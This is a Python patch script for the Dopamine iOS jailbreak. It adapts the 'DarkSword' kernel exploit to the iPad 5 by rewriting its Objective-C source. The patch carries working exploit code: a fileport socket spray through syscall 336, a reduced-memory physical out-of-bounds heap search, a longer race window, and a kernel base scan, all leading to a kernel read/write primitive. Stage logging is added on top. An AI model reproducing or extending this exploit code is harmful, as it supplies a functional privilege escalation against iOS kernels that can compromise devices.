#!/usr/bin/env python3
"""Apply the experimental iPad 5 (iPad6,11/iPad6,12) DarkSword profile.

This patch is intentionally isolated to the research/ipad5-darksword branch.
It fixes repeat-pass resource leaks, adds a lower-memory heap search profile,
cycles socket spray sizes, extends the A9 race window, and mirrors concise
DarkSword stage diagnostics to both Dopamine's live console and a persistent
DarkSword-iPad5.log inside the app's Documents directory.
"""

from pathlib import Path

TARGET = Path("Application/Dopamine/Exploits/DarkSword/DarkSword.m")
JAILBREAKER = Path("Application/Dopamine/Jailbreak/DOJailbreaker.m")


def replace_once(text: str, old: str, new: str, label: str) -> str:
    count = text.count(old)
    if count != 1:
        raise RuntimeError(f"{label}: expected exactly one match, found {count}")
    return text.replace(old, new, 1)


def patch_darksword(text: str) -> str:
    text = replace_once(
        text,
        "#include <mach/mach.h>\n",
        "#include <mach/mach.h>\n#include <mach/task_info.h>\n",
        "task-info include",
    )

    text = replace_once(
        text,
        "bool isArm64e = false;\n",
        "bool isArm64e = false;\n"
        "bool isIPad5Device = false;\n"
        "static unsigned gIPad5Pass = 0;\n"
        "static NSString *gIPad5LogPath = nil;\n",
        "iPad 5 globals",
    )

    log_helpers = r'''
static void ipad5_emit_line(const char *line)
{
    if (!line) return;

    // Keep stdout attached to Dopamine's console. The previous freopen-based
    // logger made the UI appear frozen as soon as DarkSword started.
    printf("%s\n", line);
    fflush(stdout);

    if (gIPad5LogPath) {
        FILE *logFile = fopen(gIPad5LogPath.fileSystemRepresentation, "a+");
        if (logFile) {
            fprintf(logFile, "%s\n", line);
            fclose(logFile);
        }
    }
}

static void ipad5_log_stage(const char *stage, const char *detail)
{
    if (!isIPad5Device) return;

    char line[1024] = {0};
    snprintf(line,
             sizeof(line),
             "[iPad5][DarkSword][%s][pass=%u] %s",
             stage ? stage : "unknown",
             gIPad5Pass,
             detail ? detail : "");
    ipad5_emit_line(line);
}

static void ipad5_log_memory(const char *stage)
{
    if (!isIPad5Device) return;

    mach_task_basic_info_data_t info = {0};
    mach_msg_type_number_t count = MACH_TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info(mach_task_self(),
                                 MACH_TASK_BASIC_INFO,
                                 (task_info_t)&info,
                                 &count);

    char detail[256] = {0};
    if (kr == KERN_SUCCESS) {
        snprintf(detail,
                 sizeof(detail),
                 "resident=%llu MB virtual=%llu MB",
                 (unsigned long long)(info.resident_size / (1024ULL * 1024ULL)),
                 (unsigned long long)(info.virtual_size / (1024ULL * 1024ULL)));
    } else {
        snprintf(detail,
                 sizeof(detail),
                 "task_info failed: %s",
                 mach_error_string(kr));
    }
    ipad5_log_stage(stage, detail);
}

static void ipad5_enable_persistent_log(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                               NSUserDomainMask,
                                                               YES).firstObject;
    if (documents) {
        gIPad5LogPath = [documents stringByAppendingPathComponent:@"DarkSword-iPad5.log"];
    }

    // Unbuffered output makes each stage appear immediately in the jailbreak UI.
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    char detail[PATH_MAX + 128] = {0};
    snprintf(detail,
             sizeof(detail),
             "session started; persistent copy=%s",
             gIPad5LogPath ? gIPad5LogPath.fileSystemRepresentation : "unavailable");
    ipad5_log_stage("session", detail);
}

'''
    text = replace_once(
        text,
        "pthread_t freeThread;\n",
        log_helpers + "pthread_t freeThread;\n",
        "tee-style logging helpers",
    )

    old_spray = r'''    fileport_t outputSocketPort = 0;
    fileport_makeport(fd, &outputSocketPort);
    close(fd);

    void *socketInfo = calloc(1, 0x400);
    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
    new_spray = r'''    fileport_t outputSocketPort = 0;
    kern_return_t fpkr = fileport_makeport(fd, &outputSocketPort);
    close(fd);
    if (fpkr != KERN_SUCCESS || outputSocketPort == MACH_PORT_NULL) {
        printf("[-] fileport_makeport failed: %s\n", mach_error_string(fpkr));
        return -1;
    }

    void *socketInfo = calloc(1, 0x400);
    if (!socketInfo) {
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    if (r != 0) {
        printf("[-] socket info syscall failed: %d\n", r);
        free(socketInfo);
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);
    free(socketInfo); // Important on 2 GB devices: this ran thousands of times per pass.

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
    text = replace_once(text, old_spray, new_spray, "socket spray leak fix")

    text = replace_once(
        text,
        "    for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {\n",
        "    int tryLimit = highestSuccessIdx + (isIPad5Device ? 220 : 100);\n"
        "    if (isIPad5Device && tryLimit < 420) tryLimit = 420;\n"
        "    for (int tryIdx = 0; tryIdx < tryLimit; tryIdx++) {\n",
        "A9 race attempt floor",
    )

    text = replace_once(
        text,
        "        if (tryIdx == 500) {\n",
        "        if (tryIdx == (isIPad5Device ? 900 : 500)) {\n",
        "A9 race hard cap",
    )

    old_geometry = r'''    uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
    uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);
    uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
'''
    new_geometry = r'''    uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
    uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);

    // The stock non-A18 profile maps roughly 1 GB on 16 KB-page devices.
    // iPad 5 only has 2 GB RAM, so use eight 48 MB windows (384 MB total).
    if (isIPad5Device) {
        totalSearchMappingPagesNum = 0x6000;
        searchMappingSize = 0xC00 * PAGE_SIZE;
    }

    uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
'''
    text = replace_once(text, old_geometry, new_geometry, "low-memory search geometry")

    text = replace_once(
        text,
        "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n    while (true) {\n",
        "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n"
        "    while (true) {\n"
        "        if (isIPad5Device) {\n"
        "            gIPad5Pass++;\n"
        "            ipad5_log_stage(\"heap-pass\", \"starting a new heap-layout attempt\");\n"
        "            ipad5_log_memory(\"pass-memory-start\");\n"
        "        }\n",
        "pass diagnostics",
    )

    text = replace_once(
        text,
        "            [searchMappings addObject:@(searchMappingAddress)];\n        }\n        socketPorts = [NSMutableArray new];\n",
        "            [searchMappings addObject:@(searchMappingAddress)];\n"
        "        }\n"
        "        if (isIPad5Device) ipad5_log_stage(\"heap-map\", \"search mappings allocated and touched\");\n"
        "        socketPorts = [NSMutableArray new];\n",
        "heap mapping checkpoint",
    )

    old_socket_loop = r'''        #define OPEN_MAX 10240
        int maxfiles = OPEN_MAX * 3;
        int leeway = 4096 * 2;
        for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
'''
    new_socket_loop = r'''        #define OPEN_MAX 10240
        int maxfiles = OPEN_MAX * 3;
        int leeway = 4096 * 2;
        unsigned socketTarget = (unsigned)(maxfiles - leeway);
        if (isIPad5Device) {
            // Rotate layouts instead of allocating the stock 22,528 sockets every pass.
            static const unsigned targets[] = { 8192, 10240, 12288 };
            socketTarget = targets[(gIPad5Pass - 1) % (sizeof(targets) / sizeof(targets[0]))];
            char detail[128] = {0};
            snprintf(detail, sizeof(detail), "target=%u sockets", socketTarget);
            ipad5_log_stage("socket-spray", detail);
        }
        for (unsigned socketCount = 0; socketCount < socketTarget; socketCount++) {
'''
    text = replace_once(text, old_socket_loop, new_socket_loop, "adaptive socket spray")

    text = replace_once(
        text,
        "        printf(\"[i] endPcbId: %llu\\n\", endPcbId);\n        bool success = false;\n",
        "        printf(\"[i] endPcbId: %llu\\n\", endPcbId);\n"
        "        if (isIPad5Device) {\n"
        "            char detail[160] = {0};\n"
        "            snprintf(detail, sizeof(detail), \"created=%u; scanning %llu mappings\", socketPortsCount, searchMappingNum);\n"
        "            ipad5_log_stage(\"socket-spray-complete\", detail);\n"
        "        }\n"
        "        bool success = false;\n",
        "socket spray completion checkpoint",
    )

    old_cleanup = r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
'''
    new_cleanup = r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];

            // surface_mlock stores a retained IOSurface in gMlockDict. The original
            // loop deallocated the VM range but never released that IOSurface,
            // causing every failed pass to retain hundreds of MB on 2 GB devices.
            surface_munlock(searchMappingAddress, searchMappingSize);
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
'''
    text = replace_once(text, old_cleanup, new_cleanup, "IOSurface unpin cleanup")

    text = replace_once(
        text,
        "        if (success == true) {\n            break;\n        }\n",
        "        if (success == true) {\n"
        "            if (isIPad5Device) ipad5_log_stage(\"heap-search-success\", \"corrupted socket primitive acquired\");\n"
        "            break;\n"
        "        }\n"
        "        if (isIPad5Device) {\n"
        "            ipad5_log_stage(\"heap-pass-retry\", \"no target found; resources released; retrying\");\n"
        "            ipad5_log_memory(\"pass-memory-end\");\n"
        "        }\n",
        "heap pass result checkpoint",
    )

    old_detect = r'''    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
'''
    new_detect = r'''    isIPad5Device = (bool)(strstr(name.machine, "iPad6,11") ||
                                strstr(name.machine, "iPad6,12"));
    if (isIPad5Device) {
        ipad5_enable_persistent_log();
        char detail[160] = {0};
        snprintf(detail, sizeof(detail), "model=%s; low-memory A9 profile enabled", name.machine);
        ipad5_log_stage("exploit-init", detail);
        ipad5_log_memory("exploit-memory-start");
    }

    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
'''
    text = replace_once(text, old_detect, new_detect, "iPad 5 device detection")

    text = replace_once(
        text,
        "        pe_init();\n        pe_v1();\n",
        "        if (isIPad5Device) ipad5_log_stage(\"primitive-init\", \"creating target files and race worker\");\n"
        "        pe_init();\n"
        "        if (isIPad5Device) ipad5_log_stage(\"primitive-init-complete\", \"starting physical OOB heap search\");\n"
        "        pe_v1();\n"
        "        if (isIPad5Device) ipad5_log_stage(\"pe-v1-success\", \"early kernel read/write primitive acquired\");\n",
        "exploit stage diagnostics",
    )

    text = replace_once(
        text,
        "    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;\n    while (true) {\n",
        "    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;\n"
        "    uint64_t ipad5KernelScanPages = 0;\n"
        "    if (isIPad5Device) {\n"
        "        char detail[160] = {0};\n"
        "        snprintf(detail, sizeof(detail), \"starting from %#llx\", kernel_base);\n"
        "        ipad5_log_stage(\"kernel-base-scan\", detail);\n"
        "    }\n"
        "    while (true) {\n",
        "kernel base scan start",
    )

    text = replace_once(
        text,
        "        kernel_base -= PAGE_SIZE;\n    }\n    kernel_slide = kernel_base - kconstant(staticBase);\n",
        "        kernel_base -= PAGE_SIZE;\n"
        "        ipad5KernelScanPages++;\n"
        "        if (isIPad5Device && (ipad5KernelScanPages % 256) == 0) {\n"
        "            char detail[192] = {0};\n"
        "            snprintf(detail, sizeof(detail), \"scanned=%llu pages; candidate=%#llx\", ipad5KernelScanPages, kernel_base);\n"
        "            ipad5_log_stage(\"kernel-base-scan-progress\", detail);\n"
        "        }\n"
        "    }\n"
        "    kernel_slide = kernel_base - kconstant(staticBase);\n"
        "    if (isIPad5Device) {\n"
        "        char detail[192] = {0};\n"
        "        snprintf(detail, sizeof(detail), \"base=%#llx slide=%#llx pages=%llu\", kernel_base, kernel_slide, ipad5KernelScanPages);\n"
        "        ipad5_log_stage(\"kernel-base-found\", detail);\n"
        "    }\n",
        "kernel base scan progress",
    )

    text = replace_once(
        text,
        "    printf(\"kread64(%#llx) -> %#llx\\n\", kernel_base, kread64(kernel_base));\n\n    return 0;\n",
        "    printf(\"kread64(%#llx) -> %#llx\\n\", kernel_base, kread64(kernel_base));\n"
        "    if (isIPad5Device) {\n"
        "        ipad5_log_stage(\"primitive-ready\", \"stable kernel read/write callbacks installed\");\n"
        "        ipad5_log_memory(\"exploit-memory-complete\");\n"
        "    }\n\n"
        "    return 0;\n",
        "primitive ready checkpoint",
    )

    return text


def patch_jailbreaker(text: str) -> str:
    text = replace_once(
        text,
        "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n    \n    jbinfo_initialize_boot_constants();\n    libjailbreak_translation_init();\n    libjailbreak_IOSurface_primitives_init();\n",
        "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"DarkSword: loading exploit module\" debug:NO];\n"
        "    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"DarkSword: exploit module loaded; starting kernel race\" debug:NO];\n"
        "    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"DarkSword: kernel exploit completed\" debug:NO];\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"Initializing boot constants\" debug:NO];\n"
        "    jbinfo_initialize_boot_constants();\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"Initializing kernel address translation\" debug:NO];\n"
        "    libjailbreak_translation_init();\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"Initializing IOSurface primitives\" debug:NO];\n"
        "    libjailbreak_IOSurface_primitives_init();\n"
        "    [[DOUIManager sharedInstance] sendLog:@\"Kernel primitive initialization complete\" debug:NO];\n",
        "jailbreak UI exploit checkpoints",
    )
    return text


def main() -> None:
    darksword = TARGET.read_text(encoding="utf-8")
    TARGET.write_text(patch_darksword(darksword), encoding="utf-8")

    jailbreaker = JAILBREAKER.read_text(encoding="utf-8")
    JAILBREAKER.write_text(patch_jailbreaker(jailbreaker), encoding="utf-8")

    print(f"Patched {TARGET} and {JAILBREAKER} for live iPad 5 DarkSword diagnostics")


if __name__ == "__main__":
    main()
